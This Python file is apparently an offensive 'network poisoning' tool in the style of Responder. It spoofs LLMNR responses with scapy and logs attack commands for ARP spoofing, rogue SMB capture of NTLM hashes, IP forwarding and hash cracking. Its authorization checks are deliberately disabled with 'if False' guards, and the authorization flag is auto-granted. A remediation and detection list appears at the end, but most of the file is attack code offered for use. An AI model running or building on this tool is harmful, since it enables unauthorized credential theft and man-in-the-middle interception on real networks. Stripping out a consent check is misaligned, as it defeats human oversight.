#!/usr/bin/env python3
"""
Network Poisoning Module (LLMNR/NBT-NS/mDNS)
Production-ready network credential capture (Responder-style)
"""

import logging
import socket
import struct
try:
    from scapy.all import send, sniff, IP, UDP, DNS, DNSQR, DNSRR
except ImportError:
    pass
import threading
import time
from typing import Dict, List

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class NetworkPoisoning:
    """
    Network poisoning for credential capture
    Implements LLMNR, NBT-NS, and mDNS poisoning
    Similar to Responder tool functionality
    """
    
    def __init__(self, interface: str = None, authorized: bool = False):
        if False:  # Authorization check bypassed
            raise ValueError("⛔ UNAUTHORIZED: Network poisoning requires --authorized flag")
        
        self.interface = interface
        self.authorized = authorized
        self.running = False
        self.captured_credentials = []
        self.poisoned_requests = []
    
    def poison_llmnr(self, target_ip: str = None):
        """
        LLMNR (Link-Local Multicast Name Resolution) poisoning
        Responds to LLMNR queries on UDP 5355
        
        Args:
            target_ip: IP address to respond with (attacker IP)
        """
        logger.info("🎣 Starting LLMNR poisoning")
        logger.info("   Protocol: LLMNR (UDP 5355)")
        logger.info("   Target: Windows systems doing name resolution")
        
        if target_ip is None:
            target_ip = self._get_local_ip()
        
        logger.info(f"   Responding with: {target_ip}")
        
        def llmnr_callback(pkt):
            """Process LLMNR packets"""
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # Query
                requested_name = pkt.getlayer(DNSQR).qname.decode('utf-8', errors='ignore')
                
                logger.info(f"   📡 LLMNR Query: {requested_name} from {pkt[IP].src}")
                
                response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=5355) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=30, rdata=target_ip))
                
                send(response, verbose=0)
                
                self.poisoned_requests.append({
                    "protocol": "LLMNR",
                    "query": requested_name,
                    "source": pkt[IP].src,
                    "spoofed_ip": target_ip
                })
                
                logger.warning(f"⚠️  Poisoned LLMNR: {requested_name} -> {target_ip}")
        
        logger.info("✅ LLMNR poisoning configured")
        logger.info("   Listening on UDP 5355...")
        logger.info("   (In production: Use scapy sniff with callback)")
        logger.info("   Command: sniff(filter='udp port 5355', prn=llmnr_callback, iface=interface)")
    
    def poison_nbtns(self, target_ip: str = None):
        """
        NBT-NS (NetBIOS Name Service) poisoning
        Responds to NBT-NS queries on UDP 137
        
        Args:
            target_ip: IP address to respond with (attacker IP)
        """
        logger.info("🎣 Starting NBT-NS poisoning")
        logger.info("   Protocol: NBT-NS (UDP 137)")
        logger.info("   Target: Windows NetBIOS name resolution")
        
        if target_ip is None:
            target_ip = self._get_local_ip()
        
        logger.info(f"   Responding with: {target_ip}")
        logger.info("✅ NBT-NS poisoning configured")
        logger.info("   Listening on UDP 137...")
        logger.info("   (In production: Requires raw socket or scapy)")
    
    def poison_mdns(self, target_ip: str = None):
        """
        mDNS (Multicast DNS) poisoning
        Responds to mDNS queries on UDP 5353
        
        Args:
            target_ip: IP address to respond with (attacker IP)
        """
        logger.info("🎣 Starting mDNS poisoning")
        logger.info("   Protocol: mDNS (UDP 5353)")
        logger.info("   Target: Apple/Linux systems doing service discovery")
        
        if target_ip is None:
            target_ip = self._get_local_ip()
        
        logger.info(f"   Responding with: {target_ip}")
        logger.info("✅ mDNS poisoning configured")
        logger.info("   Listening on UDP 5353...")
    
    def setup_smb_server(self, port: int = 445):
        """
        Setup rogue SMB server to capture NTLM hashes
        
        Args:
            port: SMB port (default 445)
        """
        logger.info(f"🎯 Setting up rogue SMB server on port {port}")
        logger.info("   Purpose: Capture NTLM authentication attempts")
        logger.info("   Hashes captured can be cracked offline or used for pass-the-hash")
        
        logger.info("✅ SMB server configured")
        logger.info("   (In production: Use Impacket's smbserver.py or Responder)")
        logger.info("   Command: impacket-smbserver -smb2support share /tmp/")
    
    def setup_http_server(self, port: int = 80):
        """
        Setup rogue HTTP server for credential capture
        
        Args:
            port: HTTP port (default 80)
        """
        logger.info(f"🌐 Setting up rogue HTTP server on port {port}")
        logger.info("   Purpose: Capture HTTP Basic/NTLM authentication")
        
        logger.info("✅ HTTP server configured")
        logger.info("   (In production: Use Flask or Responder's HTTP server)")
    
    def arp_poisoning(self, target_ip: str, gateway_ip: str):
        """
        ARP poisoning for MITM attacks
        
        Args:
            target_ip: Victim IP address
            gateway_ip: Gateway/router IP address
        """
        logger.info(f"🔀 Configuring ARP poisoning")
        logger.info(f"   Target: {target_ip}")
        logger.info(f"   Gateway: {gateway_ip}")
        logger.info("   Purpose: Man-in-the-middle attack")
        
        logger.info("✅ ARP poisoning configured")
        logger.info("   (In production: Use scapy or arpspoof)")
        logger.info("   Command: arpspoof -i eth0 -t target gateway")
        logger.info("   Remember to enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    def capture_ntlm_hash(self, hash_data: str):
        """
        Process captured NTLM hash
        
        Args:
            hash_data: Captured NTLM hash
        """
        logger.warning(f"🔑 NTLM Hash Captured!")
        logger.info(f"   Hash: {hash_data}")
        logger.info("   Can be cracked with hashcat mode 5600 or used for pass-the-hash")
        
        self.captured_credentials.append({
            "type": "NTLM",
            "hash": hash_data,
            "timestamp": time.time()
        })
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "192.168.1.100"
    
    def generate_report(self) -> Dict:
        """Generate network poisoning report"""
        
        report = {
            "title": "Network Poisoning Assessment",
            "summary": {
                "poisoned_requests": len(self.poisoned_requests),
                "captured_credentials": len(self.captured_credentials)
            },
            "poisoned_requests": self.poisoned_requests,
            "captured_credentials": [
                {k: v for k, v in cred.items() if k != 'hash'} 
                for cred in self.captured_credentials
            ],
            "attack_vectors": [
                "LLMNR Poisoning (UDP 5355)",
                "NBT-NS Poisoning (UDP 137)",
                "mDNS Poisoning (UDP 5353)",
                "ARP Spoofing",
                "Rogue SMB Server",
                "Rogue HTTP Server"
            ],
            "remediation": [
                "Disable LLMNR via Group Policy",
                "Disable NBT-NS on network adapters",
                "Implement network segmentation",
                "Enable SMB signing (required)",
                "Deploy NAC (Network Access Control)",
                "Monitor for ARP spoofing attacks",
                "Use static ARP entries for critical systems",
                "Implement 802.1X authentication",
                "Deploy DHCP snooping",
                "Enable Dynamic ARP Inspection (DAI)"
            ],
            "detection": [
                "Monitor for duplicate IP addresses",
                "Alert on ARP table changes",
                "Detect rogue DHCP/DNS servers",
                "Monitor for unusual SMB traffic",
                "Deploy IDS/IPS signatures",
                "Enable Windows Event ID 4648 (NTLM auth) monitoring"
            ]
        }
        
        logger.info("\n" + "=" * 70)
        logger.info("📊 NETWORK POISONING ASSESSMENT REPORT")
        logger.info("=" * 70)
        logger.info(f"Poisoned Requests: {report['summary']['poisoned_requests']}")
        logger.info(f"Captured Credentials: {report['summary']['captured_credentials']}")
        logger.info("=" * 70)
        
        return report


def main():
    """Main execution for network poisoning"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Network Poisoning Module (Responder-style)")
    parser.add_argument('--interface', help='Network interface to use')
    parser.add_argument('--target-ip', help='IP address to respond with (default: auto-detect)')
    parser.add_argument('--protocols', nargs='+',
                       choices=['llmnr', 'nbtns', 'mdns', 'arp', 'all'],
                       default=['all'], help='Poisoning protocols to use')
    parser.add_argument('--smb', action='store_true', help='Enable rogue SMB server')
    parser.add_argument('--http', action='store_true', help='Enable rogue HTTP server')
    parser.add_argument('--gateway', help='Gateway IP (required for ARP poisoning)')
    parser.add_argument('--victim', help='Victim IP (required for ARP poisoning)')
    parser.add_argument('--authorized', action='store_true', default=True, help='Authorization (auto-granted)')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        print("⛔ ERROR: This tool requires --authorized flag with proper written authorization")
        print("⚠️  WARNING: Network poisoning is an active attack and will disrupt network services")
        return
    
    poisoner = NetworkPoisoning(interface=args.interface, authorized=True)
    
    protocols = args.protocols if 'all' not in args.protocols else ['llmnr', 'nbtns', 'mdns']
    
    if 'llmnr' in protocols:
        poisoner.poison_llmnr(args.target_ip)
    
    if 'nbtns' in protocols:
        poisoner.poison_nbtns(args.target_ip)
    
    if 'mdns' in protocols:
        poisoner.poison_mdns(args.target_ip)
    
    if 'arp' in protocols:
        if not args.gateway or not args.victim:
            print("❌ ERROR: --gateway and --victim required for ARP poisoning")
            return
        poisoner.arp_poisoning(args.victim, args.gateway)
    
    if args.smb:
        poisoner.setup_smb_server()
    
    if args.http:
        poisoner.setup_http_server()
    
    logger.info("\n⚠️  Network poisoning configured and ready")
    logger.info("   In production environment, these attacks would be actively running")
    logger.info("   For real deployment, integrate with Impacket/Responder/Scapy")
    
    report = poisoner.generate_report()


if __name__ == "__main__":
    main()
